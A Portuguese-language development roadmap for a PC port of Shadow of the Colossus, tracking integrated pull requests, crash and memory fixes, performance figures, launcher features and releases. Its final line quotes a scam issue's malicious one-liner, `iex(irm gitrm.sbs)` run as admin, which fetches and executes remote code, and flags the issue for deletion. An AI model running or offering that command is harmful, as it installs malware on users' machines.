# Roadmap — Shadow of the Colossus PC

Atualizado a cada correção. Legenda: ✅ feito · 🔧 em andamento · ⏳ pendente

**Estratégia (19/10/2026):** integrar e testar as pull requests e forks da comunidade em vez de refazer
o trabalho. Branch local `comunidade` = `main` (0.57) + PRs integradas. As correções equivalentes que
fiz no branch `sotc` ficam de fora quando a comunidade já as tem (e testou em hardware que não temos).

## Fase 0 — Integração da comunidade

| # | Item | Estado | Notas |
|---|---|---|---|
| 0.1 | PRs pequenas do Lucas-blip-png: #46, #47, #52, #53, #106, #108 | ✅ | #48, #105 e #107 já cobertas pela #98. #47 com conflito resolvido (RTZ na NVIDIA + pacote tipo 2). |
| 0.2 | #98 (Gabriell-os): AMD + #32 + #59 + #83 (Oussama268) | ✅ | Wave64 uniforme na AMD, blocos de 64 MiB na arena, fila de avisos que cresce, cache de formatos, readbacks assíncronos etc. |
| 0.3 | #103 (Oussama268): cortes no processador de comandos, liberação de VRAM fria | ✅ | `00fe449`. Conflito com a #98 na arena: mantidos os blocos de 64 MiB; a liberação passou a ser por trecho residente (com releitura e comparação). Teste forçado (`SOTC_ARENA_EVICT_MB=256`): 10 min, 1,5 GB liberados em 118 passadas, 0 erros, VRAM 2,7 GB (antes ~4,3). Benchmark com cache pronto: **62,6 FPS média, 30,9 mínima** (antes ~54–55 e ~26). |
| 0.4 | #81 (jownatan): Intel Arc B580 | ✅ | Só as partes exclusivas (a compilação em segundo plano e a pré-carga já vieram, para todas as GPUs, pela #83): trava de regiões sem deadlock no Windows, `SotC-Shaders.ps1`, e a espera da thread de gravação como opção `SOTC_REC_SLEEP_US` (2 ms fixos custavam 6% no desktop: 57,7 vs 61,1 FPS; notebooks/APUs: `2000`). |
| 0.5 | #69 (DUDUYG): menos CPU por draw, thread de preparação de draws | ⏳ decisão | Conflita com a linha do Oussama em 31 arquivos (~110 trechos). A medição anterior (56,9 / 41,2) **não vale**: no build da #69 o jogo pula a intro e cai num demo diferente (Wander montado, dicas de tutorial), mais leve na ponte. Mesmo demo sem DMA no `comunidade`: 61 / 26–27 (DMA não muda o pior trecho). Ganho documentado pelo autor (PC dele): preparação de draws +3,6% média / +10% trecho pesado; memos −6 a −11% de CPU por comando; parte se sobrepõe aos cortes do Oussama. |
| 0.6 | Fork xeodeo `v0.57-fixed.1`: bloco preto da AMD RDNA3/4 (#43), BC5/BC6H sem storage | ✅ | `9075c6a` (barreira entre a limpeza do swapchain e a cópia) e `ef72bdb` (só o trecho do `image.cpp`). Sem AMD aqui: só conferido que a NVIDIA segue correta. De fora: menu dentro do jogo, PGO e ícones Xbox/Nintendo (`glyphs/` feitos das texturas do jogo = material da Sony; o autor vai gerá-los localmente na próxima versão). A gravação Vulkan dormindo 2 ms já é opção (0.4). |
| 0.7 | Fork nakaionyt `v0.57-fg2` (y7ngboy): geração de quadros, sombras distantes reaproveitadas, ritmo de quadros, overlay F10, trava F7 | ✅ | Commits próprios aplicados (fora versão/README e textos fixos em inglês); conflitos resolvidos (menu + overlay, ritmo de quadros do fork no lugar do `SOTC_FLIP_LATE` da #98, `fsr-vulkan` adicionado uma vez). **FSR 3 testada na RTX 2060**: 30 quadros gerados por segundo com o jogo a 33,3 ms → 60 na tela. DLSS-G (RTX 40/50) entra no código mas precisa das DLLs oficiais da NVIDIA ao lado do exe (não baixadas; não testada). Sombras reaproveitadas: ~650–1.270 cascatas por janela, 0 recusadas, imagens corretas; FPS 62–63 (antes 61–62: aqui o limite é a CPU). Lançador: com 60 FPS desligado, trava em 30. **Teste do usuário (1 h, pacote `dist/SotC-PC-teste`): jogo bom; FSR 3 sem efeito visível com o modo 60 FPS ligado (60→120 numa tela de 60 Hz) e barra de vida/stamina tremendo (a interpolação inclui a HUD; o jogo desenha HUD e cena juntos).** Geração de quadros fica desligada por padrão e marcada como experimental no lançador (`766cbcf`). |
| 0.8 | Demais PRs (#94 menu, #54 widescreen, #118 F11, #130/#39 Linux, #99/#132 refatoração grande do CP) | ⏳ | Avaliar uma a uma. |
| 0.9 | Corrigir autor dos commits 1bb9dd5/83f88ff (branch `ajncsystem-estabilidade-fps`, PR #93) | ⏳ | |
| 0.10 | Fork do Oussama268 (opt5–opt7): thread de draws (#99 Lucas-blip-png + correções), DMA incremental, tradução de shaders e pipelines de compute em threads auxiliares, cache separado do modo Pro | ✅ | Branch `oussama-int`, juntado ao `comunidade`. Conflitos resolvidos (sombras do nakaionyt usam `DrawRegs()` da thread de draws; mutex de `gpu_modified_ranges`; versão do cache 33). Pré-carga em threads auxiliares (`e8e304f`) **revertida**: com o nosso cache de pipelines derrubava o driver NVIDIA no boot. Demo: média 63 → 65–67, mínima 30 → 34–37, ponte 30–32 → 37–40. Teste do usuário na cascata: "FPS muito melhor". Observação: o demo da tela de título às vezes sai do trilho (já acontecia antes). |
| 0.11 | #118 (EdouardSence): **F11 alterna janela / tela cheia**; ícone da janela no Linux | ✅ | `f059064`. O ícone escolhido no lançador (desenho do menino / imagem própria) continua valendo por cima do da PR. |
| 0.12 | #151: lançador quebrava no Windows em chinês (codec gbk e o "™" do título) | ✅ | `bd45855`. Saída dos scripts sempre em UTF-8. Testado simulando console gbk. |
| 0.13 | #142/#145: 21:9 e 32:9 com bordas pretas | ✅ | `5245180`. Com o modo PS4 Pro ligado o tamanho largo era ignorado sem aviso (o caminho Pro só tem tamanhos 16:9). Agora a tela larga tem prioridade; o log e o resumo do lançador avisam "PS4 Pro desligado (tela larga)". Jogo que não é EU 1.01 continua sem tela larga (já avisava no log). |
| 0.14 | #143: "limite de 6 GB de VRAM" | ✅ | `988dc52`. A limpeza agressiva de texturas começava em 60% da memória da placa e a arena liberava a partir de 1,5 GB. Nova opção **Uso de memória de vídeo**: Econômico 50%/1 GB, Padrão 60%/1,5 GB, Alto 75%/4 GB, Máximo 85%/nunca (`SOTC_VRAM_GC_PERCENT`, `SOTC_ARENA_EVICT_MB`). Teste de 150 s no Máximo: estável, 0 coletas de emergência. O "limite de 16 GB de RAM" não existe no código (é a memória do PS4 emulado). |
| 0.15 | #49: em 60 FPS o golpe da espada dá pouco dano | ❎ não é bug | Avaliação do mantenedor: modo Difícil (dano menor) ou golpe num ponto fraco que já apagou. Responder na issue pedindo para conferir. |
| 0.16 | #137: placa de 6 GB fechava com "Failed to allocate buffer arena memory" | ✅ | `12410ef`. Depois da limpeza de emergência o jogo pedia de novo um bloco inteiro de 64 MiB; agora tenta só o tamanho pedido e depois a RAM do PC antes de desistir. A mensagem final indica o nível Econômico. Só roda quando a memória acaba (não reproduzido aqui; compilado). |
| 0.17 | #147: texturas aparecendo atrasadas e luz piscando na 0.58.1 (NVIDIA) | 🔍 | Log sem erro. Suspeita: liberação de memória fria (um bloco que volta passa um quadro zerado) e a limpeza de texturas a 60%. Pedir teste com **Uso de memória de vídeo = Máximo** (desliga a liberação). |
| 0.18 | #149 / #91: modo PS4 Pro derruba o jogo (ao carregar save) | ✅ | `8ee28b2`. Dois logs de queda do usuário (19/10, modo Pro): o alocador do próprio jogo procura um bloco livre num mapa de bits de 64 KiB que cobre a memória direta (5696 MiB no Pro); cheio, lê fora do mapa (offset 0x1a371, leitura de -1). Agora o modo Pro recebe 9152 MiB, como as resoluções largas. Demo no Pro: 150 s, média 64,3, sem falha. Falta confirmar na AMD (#149). |
| 0.19 | #141/#148: tela/quadrados pretos piscando com FSR 3 na AMD (RX 7800 XT) | 🔍 AMD | Some ao desligar a geração de quadros. O fork do nakaionyt (origem do FSR 3) não tem correção mais nova. Precisa de placa AMD para testar. |
| 0.20 | #146: queda nas cenas finais depois do Malus | ✅ **zerável** | 20/10: o usuário jogou do save "15 derrotados" até os créditos (texturas HQ, modo Pro, 60 FPS) com a PR #191. Caiu só no carregamento pós-créditos (`0x49500`, heap h7): a guarda BPE pegava a faixa dos heaps em [heap+0x28] (ponteiro comum a todos; +0x30 = bytes em uso). `2bed92e`: heaps do mundo protegidos pela faixa dos próprios blocos livres (FreeExtent). Save pós-jogo "Todos os colossos derrotados - Normal+(1)" carregado e jogado até o 2º colosso sem queda (20/10). |
| 0.21 | #95: som baixo | ✅ | `c102242`. Opção **Volume** (Configurações > Som): 100/150/200/300%, com suavização dos picos acima de 100% (`SOTC_VOLUME`). Medido gravando o som do demo: 200% dobra o nível exato (pico 0,23 → 0,46); o jogo usa menos de 1/4 da escala, então 300% quase não precisa suavizar. |
| 0.22 | #136: atualização automática no lançador | ✅ | `8f91784`, do Oussama268 (2a560cd), apontando para o nosso GitHub. Procura ao abrir (opção) e pelo link "Procurar atualização"; pergunta antes de baixar, confere tamanho/SHA-256/estrutura do zip, mantém user/, update/ e sotc.ini, desfaz se der erro. 9 testes dele passam; o exe compilado consulta o GitHub e responde "em dia (0.58.1)". Instalação de verdade só dá para ver quando sair a 0.59. |
| 0.23 | **Publicar v0.59** | ✅ | Thread de desenhos do Oussama, F11, ultrawide+Pro, memória de vídeo, volume, atualização automática, #151, #137, #146 (em teste). |
| 0.24 | #178/#157/#163: sombras distantes piscando (qualquer placa) | ✅ | PR #170 (Lucas-blip-png) juntada: reutilização de sombras (nakaionyt, desde a 0.58) desligada por padrão; ela desenhava as cascatas distantes em quadros alternados e o jogo não guarda a pulada (0,36% → 0,01% de pixels piscando, −0,5% de FPS). O fork do Oussama não tem essa reutilização. Demo: média 65,6, mínima 50,1, sem falhas. `SOTC_SHADOW_REUSE=1` religa. |
| 0.24b | Opção **Sombras distantes** no lançador (Desligado padrão / Ligado / Automático) | ✅ | `ab04269`. Medido no demo inteiro: desligada média 61,8 / mínima 37,2; ligada 59,5 / 35,6, ou seja a reutilização não ganha FPS e ainda pisca (AMD, GTX 1080, RTX 40/50). O Oussama nunca teve esse recurso. |
| 0.25 | Fork do Oussama **opt8** | ✅ | AMD: acesso direto à memória desligado por padrão (listras nas sombras/água); Intel: tamanhos de dispatch, layouts, sem int64 quando a GPU não tem, subgroup fixo; log mostra GPU e driver (`SOTC_GPU_VENDOR` escolhe a GPU em notebook); correções de revisão. A trava do Windows (#81) já tínhamos. **Pré-carga assíncrona** (tela preta de 98 s após atualizar driver) fica de fora: derrubou o driver NVIDIA aqui antes; testar à parte. Demo: 62,5 / 36,7. |
| 0.26 | **Jogo não abria em PC com pouca memória** (regressão da 0.59) | ✅ | `158e514`. Os 9152 MiB (10176 com a memória flexível) eram reservados de uma vez; com pouca RAM e arquivo de paginação pequeno o Windows recusava (erro 1450) e o jogo caía no boot (log de uma APU AMD). Agora volta para 5056 MiB (5696 no Pro) e avisa no log. |
| 0.27 | Configurações por cópia do port (pedido do usuário) | ✅ | `016a891`. Antes todas as cópias usavam `%APPDATA%\sotc-launcher\settings.json` e uma cópia nova seguia usando a pasta `user` da primeira. Agora `user\launcher_settings.json` de cada cópia; na primeira vez herda as configurações antigas e **copia** saves e módulos de som da cópia antiga. Testado com pastas simuladas. |
| 0.28 | #152/#158/#187 + relato do usuário: personagens e Agro brancos/brilhando em AMD GCN (RX 570/580, APUs Vega; driver legado 2.0.279) | 🔍 | Acontece em todos os portes (inclusive o do Oussama). Descartados pelo usuário no PC AMD: `SOTC_WAVE64_UNIFORM=0`, `SHADPS4_IEEE_MINMAX=1`, `SOTC_WAVE64_IDENTITY=0`. Subgroup 64 nativo (o caminho de 32 lanes não se aplica). Achado e corrigido um defeito no fallback de atômicos float min/max (`1c94d80`), mas o SotC não usa esses atômicos (4800 shaders conferidos): não é a causa. Faltam na GCN: `VK_EXT_image_2d_view_of_3d`, `shader_atomic_float2`, `maintenance5/8`. Próximo passo: captura RenderDoc (F12) no PC AMD. |
| 0.29 | PRs da comunidade (20/10) | ✅ | #169 texturas GTX 10xx (Lucas), #174 relógio por QPC (Einar), #177 FSR 3 RX 7000 (KingJhoss), #168 guardas sem reconstruir (+6%), #183 60 FPS pelo modo Desempenho do jogo (fps60game), #171 botão JOGAR, #175 log pelo SotC.bat, #181 ferramentas de medição, #154 geração de quadros sem HUD (desligada, `SOTC_FG_HUDLESS=1`). Conflito só na #154 (base antiga, antes da thread de desenhos). Demo: 62,6 / 37,2 e 63,0 / 37,3. Uma rodada travou aos 165 s (`PS4SyncEvent`), trava intermitente do demo que já acontecia antes. |
| 0.30 | #186: "Texturas em alta qualidade" esgota a memória do jogo em vistas amplas (`0x1a371`) | ✅ | PR #191 (Lucas-blip-png) juntada, combinada com o ajuste ao vivo do menu: abaixo de 8% de páginas livres no pool de 64 KiB do jogo as texturas vistas pedem 1 mip a mais, abaixo de 4% dois. No demo com 9152 MiB o pool fica em 0% livre e pede mip 4 (ainda mais nítido que a opção desligada, que não pede nenhum). Demo: 59,7 / 34,3 (ligada) e 61,0 / 36,3 (desligada), sem falhas. Provável fim da queda do final (#146). |
| 0.31 | **Publicar v0.60** | ✅ | |
| 0.32 | PRs #94 (menu no jogo, nosekefik), #110 (pasta WpSystem fora da busca), #121 (docs) | ✅ | #94: o menu do Bloodborne (Insert / F1 / L3+R3) passa a ser do SotC e **ligado por padrão** (`BB_OVERLAY_MENU=0` desliga): FPS, GPU e VRAM, tela cheia, resolução, escala e nitidez, câmera e mouse, efeitos. Conflito resolvido mantendo os textos traduzidos da lista de saves. Testado abrindo o menu no demo (foto): 72,5 FPS, sem falha. |
| 0.33 | README só em inglês (objetivo da #93) | ✅ | `7e7cc1b`. Problemas conhecidos atualizados (#186, GCN, 60 FPS, geração de quadros). Créditos da comunidade. |
| 0.34 | #60 (Oussama268): remover sobras do Bloodborne | ✅ | `d6cb6da`, refeito sobre o código atual (a PR era da 0.57): −11.700 linhas. Mantidos o FSR-Vulkan (geração de quadros FSR 3) e o menu da #94. Ícone do SotC no bb-probe.exe. Demo 71,7 / 61,3, sem falhas; testes passam (exceto test_packaged_vulkan, só Linux, que já falhava). |
| 0.35 | **Publicar v0.60.1** | ✅ | Menu no jogo, limpeza do Bloodborne, README em inglês. |
| 0.36 | Menu no jogo: mouse solto enquanto aberto | ✅ | `8856f67`. Ficava no modo relativo da câmera (escondido, preso no centro). |
| 0.37 | Ajuste rápido dentro do jogo (pedido do usuário) | ✅ | `f1aa65d`. 60 FPS (F7), geração de quadros (Set), texturas HQ e reaproveitamento de sombras ao vivo (`sotc_live.h`), volume (`runtime_audio_set_volume_percent`). Grava no `launcher_settings.json` (`SOTC_LAUNCHER_SETTINGS`); o lançador relê ao fim do jogo. Foto do menu em português conferida; cliques testados pelo usuário. |
| 0.38 | Tela de carregamento animada durante a montagem dos shaders | ✅ | `c405137`. WarmUp saiu do construtor do PipelineCache para o fim do Presenter, com uma thread apresentando quadros em branco com a tela de carregamento. Tela opaca, animação no centro. |
| 0.39 | **Publicar v0.60.2** | ✅ | |
| 0.40 | PR #196 (Lucas): janela de 64 KiB nas leituras da GPU | ✅ | +2,7% no templo (medido por ele). |
| 0.41 | **Publicar v0.60.3** ("zerável do início ao fim") | ✅ | |
| 0.42 | Blocos ciano em pedras entalhadas e flores piscando com texturas HQ (foto do usuário, final do jogo) | ✅ | `212d7e6`. A troca de mip da PR #191 oscilava (4,3,2,3,2) com um limiar só; histerese: grosso abaixo de 8% (2 níveis abaixo de 3%), fino só acima de 6%/16%. Usuário jogou do Novo Jogo+ ao 2º colosso: 3 trocas (4→3→2), sem blocos, sem flores piscando, sem quedas. Save pós-jogo carregou: queda pós-créditos confirmada como corrigida. |
| 0.43 | **Publicar v0.60.4** | ✅ | Comentado na PR #191 para o Lucas. |

## Fase 1 — Estabilidade (quedas e travamentos)

| # | Item | Estado | Notas |
|---|---|---|---|
| 1 | Jogo congela ("STOP: GPU hook queue overflow") | ✅ | Na #98 (Gabriell-os `3394cd0`); eu tinha feito igual (`c69befb`, branch `sotc`). |
| 2 | Limite de alocações de VRAM (`EnsureResident: Assertion Failed`, AMD) | ✅ | Na #98 (blocos de 64 MiB, `9563b7d`); igual ao meu `c69befb`. |
| 3 | Liberar VRAM sem uso (placas de 4–6 GB) | ✅ | Da #103, adaptada aos blocos (0.3). Meu `1b62560` fica de fora: não comparava a arena com a memória do jogo antes de liberar (risco de cenas apagadas, achado do Oussama). |
| 4 | Fault 0x1a371 no modo PS4 Pro (após 1º/2º colosso) | ✅ | PR #106 (+640 MiB no modo Pro); mesma conclusão que a minha (`c2614b0`/`7d9ee11`). |
| 4b | Streaming de texturas desligado sem querer desde a v0.0.13 | ✅ | Opção "Texturas em alta qualidade" nos Ajustes rápidos, **ligada por padrão** (`SOTC_LOD_LINGER=1`: os bancos usados desde o último relatório contam como amostrados). Comparação na árvore da abertura: folhas borradas → nítidas. Testes anteriores equivalentes: 10+15 min normal e 7,5 min Pro sem queda; carregar save com ela ligada ainda sem teste automático. |
| 5 | Queda na intro final | ⏳ | Aguardando log/cena do usuário. |
| 6 | Release v0.58 | ✅ | **Publicada em 19/10** (tag `v0.58` = `0ac9252`, SotC-PC.zip 84 MB, Latest). Releases públicas: 0.58, 0.57, 0.56. O rascunho antigo 0.58-rc1 (AMD preview, não público) ficou. |

## Fase 2 — Modo 60 FPS

| # | Item | Estado | Notas |
|---|---|---|---|
| 7 | Física/tempo no dobro: parede do 2º colosso (#120), colossos voando (#100), queda na ponte (#63) | 🔧 | Alternativa pronta (0.7): jogo a 30 + geração de quadros = 60 na tela sem mexer na física. O modo 60 FPS nativo continua com os defeitos. |

## Fase 3 — AMD e outras GPUs

| # | Item | Estado | Notas |
|---|---|---|---|
| 8 | AMD (#122, #87, #86, #82, #43), GTX 1060/1070 (#102, #68), Intel Arc (#16) | 🔧 | #98, #81 (partes) e xeodeo integrados; falta teste em AMD/Intel reais (pedir a jogadores). GTX 10xx sem trabalho ainda. |

## Fase 4 — Desempenho

| # | Item | Estado | Notas |
|---|---|---|---|
| 9 | Processador de comandos (meta 40–60 FPS estáveis) | 🔧 | #59/#83/#103 integradas (+10% no demo); falta 0.5 (#69). |
| 10 | FPS baixo em PCs fortes (#129), templo (#14) | ⏳ | |

## Fase 5 — Extras

| # | Item | Estado | Notas |
|---|---|---|---|
| 11 | Pré-compilar shaders (#124), auto-update (#136), versão sem AVX2 (#70, #89, #88) | ⏳ | #83 já lê os caches em paralelo (50 s → 0,9 s) e compila pipelines em segundo plano. |

## Fase 6 — Lançador e janela (pedidos do usuário, 19/10)

| # | Item | Estado | Notas |
|---|---|---|---|
| 12 | Idiomas do lançador: espanhol, chinês (simplificado), coreano, russo | ✅ | `ac18022`. 224 textos por idioma em `launcher/sotc_i18n.py` (procurados pelo texto em português; o que faltar sai em inglês); fonte Microsoft YaHei UI / Malgun Gothic para chinês/coreano; conferido na tela. |
| 13 | Opção de FPS: 30 / 60 / ilimitado | ✅ | `3b433bd`. 60 = sem o limite do jogo, no máximo 1 quadro a cada 2 vblanks de 120 Hz (`SOTC_FPS_LIMIT`); demo nunca acima de 60,0. |
| 14 | Ícone do jogo na janela, versão e FPS no título | ✅ | `d7bb081`. Ícone tirado do `icon0.png` do dump do jogador (nada da Sony no pacote); título "SHADOW OF THE COLOSSUS™ · v01.01 · 60 FPS". |
| 15 | DLSS-G (RTX 40/50) no pacote | ✅ | `0ab2ff7`. Runtime oficial NVIDIA Streamline 2.14.16 (11 MB, assinaturas verificadas) + licenças em `bin/licenses-nvidia`, fora do git (`../SotC-deps`). Na RTX 2060 a DLSS-G é recusada e a FSR 3 assume. Não testada em RTX 40/50 (outros projetos já testaram numa 4080). |
| 16 | Overlay F10 e mensagens F7/F8 no idioma do lançador | ✅ | `9656fa4` (os textos do fork de geração de quadros estavam em francês). |
| 17 | Widescreen / ultrawide (16:10, 21:9, 32:9, Hor+) | ✅ | PR #54 (tabnul), `72d2a69`. Testado em 2560x1080: imagem mais larga, sem esticar, sem erros. |
| 18 | Ícones de botões Xbox no jogo (opção PlayStation / Xbox) | ✅ | Mecanismo de troca de texturas do xeodeo (`5cfd8ea`); 12 ícones desenhados do zero (`tools/make_button_icons.py`, `glyphs/xbox`): A B X Y, RB, LT/RT, LS/RS, Menu, View. Opção em Controles no lançador. Conferido no menu: B = retroceder, A = confirmar. |

| 19 | Modo PS4 Pro nos Ajustes rápidos | ✅ | `c407620`. |
| 20 | Idioma na primeira tela do lançador | ✅ | `8508a33`. Seletor 🌐 no canto da tela de boas-vindas; o lançador reabre no idioma escolhido. |
| 21 | Imagem de cada save na lista (como no PS4 / shadPS4) | ✅ | O `icon0.png` de cada save à esquerda do título, detalhes e data. |

| 22 | Tela de carregamento e barra de % dos shaders | ✅ | `2eb2f7e`. Aparece quando o jogo passa 1 s sem desenhar (boot, cache de shaders, cargas longas); barra com % enquanto o cache é lido. Com o cache pronto dura ~0,3 s; o preto que vem depois é o próprio jogo carregando os logos. |

| 23 | Ícone próprio da janela do jogo (menino com a espada; ou o do jogo, ou imagem do jogador) | ✅ | `83ecb1c`. |
| 24 | Release v0.58.1 | ✅ | Publicada em 19/10 (texturas em alta qualidade + ícone da janela). Releases públicas: 0.58.1, 0.58, 0.57 (0.56 removida; tag mantida). |

## Fora do roteiro

- Issue #138 é golpe (malware: `iex(irm gitrm.sbs)` como admin) — apagar e denunciar a conta.
